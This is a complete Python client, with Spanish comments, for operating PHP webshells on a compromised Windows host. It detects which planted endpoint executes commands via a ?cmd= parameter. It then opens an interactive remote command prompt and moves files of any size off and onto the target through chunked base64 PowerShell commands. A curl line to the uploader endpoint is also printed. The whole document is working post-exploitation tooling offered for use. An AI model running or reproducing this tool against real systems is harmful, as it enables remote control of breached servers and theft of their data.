import requests
import urllib.parse
import sys
import os
import argparse

# Códigos de color ANSI para la terminal
VERDE = "\033[92m"
AZUL = "\033[94m"
ROJO = "\033[91m"
AMARILLO = "\033[93m"
RESET = "\033[0m"

# CONFIGURACIÓN: Lista única con todas tus rutas combinadas
ENDPOINTS = [
    "http://192.168.20.10:8000/path/uploader.php",
    "http://192.168.20.10:8000/path/shell.php"
]

URL_SHELL = None

def escanear_y_clasificar():
    """Recorre las rutas y detecta la primera webshell funcional."""
    print("[*] Iniciando análisis dinámico de comportamiento PHP...\n")
    webshells_encontradas = []
    uploaders_encontrados = []

    for url in ENDPOINTS:
        try:
            token_prueba = "VERIFY_SHELL_OK"
            cmd_codificado = urllib.parse.quote(f"echo {token_prueba}")
            respuesta_get = requests.get(f"{url}?cmd={cmd_codificado}", timeout=2)

            if respuesta_get.status_code == 200 and token_prueba in respuesta_get.text:
                print(f"{VERDE}[+] Webshell Confirmada:{RESET} {url}")
                webshells_encontradas.append(url)
                continue

            archivo_simulado = {'file': ('check.txt', 'ping')}
            respuesta_post = requests.post(url, files=archivo_simulado, timeout=2)

            if respuesta_post.status_code == 200 and "OK" in respuesta_post.text:
                print(f"{AZUL}[+] Uploader Confirmado:{RESET} {url}")
                uploaders_encontrados.append(url)
            else:
                if respuesta_get.status_code == 200:
                    print(f"{AMARILLO}[!] Archivo activo pero sin comportamiento:{RESET} {url}")
                else:
                    print(f"{ROJO}[-] Inaccesible (HTTP {respuesta_get.status_code}):{RESET} {url}")
        except requests.exceptions.RequestException:
            print(f"{ROJO}[-] Error de red / Timeout:{RESET} {url}")

    print("\n" + "="*60)
    print("               RESUMEN DE DISPONIBILIDAD")
    print("="*60)
    print(f" Webshells operativas (GET/system):  {VERDE}{len(webshells_encontradas)}{RESET}")
    print(f" Uploaders operativos (POST/move):   {AZUL}{len(uploaders_encontrados)}{RESET}")
    print("="*60 + "\n")

    return webshells_encontradas[0] if webshells_encontradas else None


def ejecutar_comando(comando):
    """Envía comandos normales devolviendo texto plano de forma segura."""
    if not URL_SHELL:
        return None
    try:
        comando_codificado = urllib.parse.quote(comando)
        respuesta = requests.get(f"{URL_SHELL}?cmd={comando_codificado}", timeout=30)
        if respuesta.status_code == 200:
            return respuesta.text.strip()
        return None
    except requests.exceptions.RequestException:
        return None

def bajar_archivo(ruta_remota, ruta_local):
    """Descarga binarios puros (ZIP, RAR) de tamaño ilimitado sin corromper bytes."""
    print(f"[*] Descargando '{ruta_remota}' -> '{ruta_local}'...")
    import base64

    # Obtener tamaño real utilizando comillas dobles externas para encapsular las simples de PowerShell
    cmd_size = f'powershell -Command "(Get-Item \'{ruta_remota}\').Length"'
    size_str = ejecutar_comando(cmd_size)
    
    try:
        total_bytes = int(size_str)
        print(f"[*] Tamaño detectado: {total_bytes / (1024*1024):.2f} MB")
    except (ValueError, TypeError):
        print("[!] Error: No se pudo determinar el tamaño del archivo remoto.")
        return

    tamano_bloque = 1024 * 1024  # Bloques de 1 MB
    offset = 0

    try:
        with open(ruta_local, "wb") as f_local:
            while offset < total_bytes:
                # Corregido: OpenRead + codificación Base64 limpia desde memoria .NET sin romper comillas
                comando = (
                    f"powershell -Command \""
                    f"$stream = [System.IO.File]::OpenRead(\'{ruta_remota}\'); "
                    f"[void]$stream.Seek({offset}, [System.IO.SeekOrigin]::Begin); "
                    f"$bytes = New-Object byte[] {min(tamano_bloque, total_bytes - offset)}; "
                    f"[void]$stream.Read($bytes, 0, $bytes.Length); "
                    f"[Convert]::ToBase64String($bytes); "
                    f"$stream.Close();\""
                )
                
                # Ejecución HTTP directa evitando decodificaciones restrictivas de texto locales
                comando_codificado = urllib.parse.quote(comando)
                res = requests.get(f"{URL_SHELL}?cmd={comando_codificado}", timeout=30)
                
                if res.status_code != 200 or not res.text:
                    print(f"\n[!] Error crítico en el fragmento en la posición {offset}.")
                    break

                # Eliminamos cualquier salto de línea y decodificamos directamente la ráfaga Base64 pura
                datos_binarios = base64.b64decode(res.text.strip().replace("\r", "").replace("\n", ""))
                f_local.write(datos_binarios)
                
                offset += len(datos_binarios)
                print(f"\r[+] Descargando: {(offset / total_bytes) * 100:.2f}% ({offset / (1024*1024):.2f} MB)", end="", flush=True)
            print("\n[+] Descarga completada con éxito. Archivo verificado y sin corrupción.")
    except Exception as e:
        print(f"\n[!] Error durante la descarga: {e}")


def subir_archivo(ruta_local, ruta_remota):
    """Sube binarios grandes de forma fragmentada en ráfagas de 1 MB."""
    if not os.path.exists(ruta_local):
        print(f"[!] El archivo local '{ruta_local}' no existe.")
        return

    import base64
    total_bytes = os.path.getsize(ruta_local)
    print(f"[*] Subiendo '{ruta_local}' -> '{ruta_remota}' ({total_bytes / (1024*1024):.2f} MB)...")

    # Limpiar archivo previo de forma segura
    ejecutar_comando(f"powershell -Command \"if (Test-Path \'{ruta_remota}\') {{ Remove-Item \'{ruta_remota}\' }}\"")

    tamano_bloque = 1024 * 1024
    offset = 0

    try:
        with open(ruta_local, "rb") as f_local:
            while offset < total_bytes:
                bloque = f_local.read(tamano_bloque)
                if not bloque:
                    break

                contenido_b64 = base64.b64encode(bloque).decode('utf-8')
                comando = (
                    f"powershell -Command \""
                    f"$b = [Convert]::FromBase64String(\'{contenido_b64}\'); "
                    f"[System.IO.File]::AppendAllBytes(\'{ruta_remota}\', $b);\""
                )
                
                comando_codificado = urllib.parse.quote(comando)
                requests.get(f"{URL_SHELL}?cmd={comando_codificado}", timeout=30)
                
                offset += len(bloque)
                print(f"\r[+] Subiendo: {(offset / total_bytes) * 100:.2f}% ({offset / (1024*1024):.2f} MB)", end="", flush=True)
            print("\n[+] Archivo subido y ensamblado correctamente en destino.")
    except Exception as e:
        print(f"\n[!] Error durante la subida: {e}")


def main():
    global URL_SHELL
    print("\n" + "="*60)
    print("      WEBSHELL INTERACTIVA - by kr1pt0n")
    print("="*60)
    
    URL_SHELL = escanear_y_clasificar()

    if not URL_SHELL:
        print(f"{ROJO}[!] Error: No se encontró ninguna Webshell interactiva funcional.{RESET}")
        sys.exit(1)

    print(f"[*] Canal interactivo establecido en: {VERDE}{URL_SHELL}{RESET}")
    usuario = ejecutar_comando("whoami") or "user"
    ruta_actual = ejecutar_comando("cd") or "C:\\"

    print(f"[+] Conectado con éxito como: {usuario}")
    print("[*] Comandos especiales locales:")
    print("    -> upload <archivo_local> <nombre_remoto>")
    print("    -> download <archivo_remoto> <nombre_local>")
    print("    -> exit / clear")
    print("    >> Uso de los uploaders")
    print('''
    -> curl -F "file=@/ruta/de/tu/archivo/local" http://192.168.20.10:8000/path/uploader.php
    
''')

    while True:
        try:
            prompt = f"({usuario}) {ruta_actual}> "
            comando = input(prompt).strip()
            
            if comando.lower() == 'exit':
                print("[*] Cerrando sesión...")
                break
            if not comando:
                continue
            if comando.lower() in ['clear', 'cls']:
                print("\033[H\033[2J", end="")
                continue

            if comando.startswith("upload "):
                partes = comando.split(" ")
                if len(partes) >= 3:
                    subir_archivo(partes[1], partes[2])
                else:
                    print("[!] Uso: upload <archivo_local> <ruta_remota>")
                continue

            if comando.startswith("download "):
                partes = comando.split(" ")
                if len(partes) >= 3:
                    bajar_archivo(partes[1], partes[2])
                else:
                    print("[!] Uso: download <ruta_remota> <archivo_local>")
                continue

            if comando.startswith("cd "):
                partes = comando.split(" ", 1)
                if len(partes) >= 2:
                    nueva_ruta = partes[1].strip()
                    resultado = ejecutar_comando(f"cd /d \"{ruta_actual}\" && cd /d \"{nueva_ruta}\" && cd")
                    if resultado and "El sistema no puede encontrar" not in resultado:
                        ruta_actual = resultado
                    else:
                        print(f"\n[!] Ruta no encontrada: '{nueva_ruta}'\n")
                else:
                    print(f"\n{ruta_actual}\n")
                continue
            else:
                salida = ejecutar_comando(f"cd /d \"{ruta_actual}\" && {comando}")
                if salida:
                    print(f"\n{salida}\n")
        except KeyboardInterrupt:
            print("\n\n[*] Saliendo de forma segura...")
            break


if __name__ == "__main__":
    main()
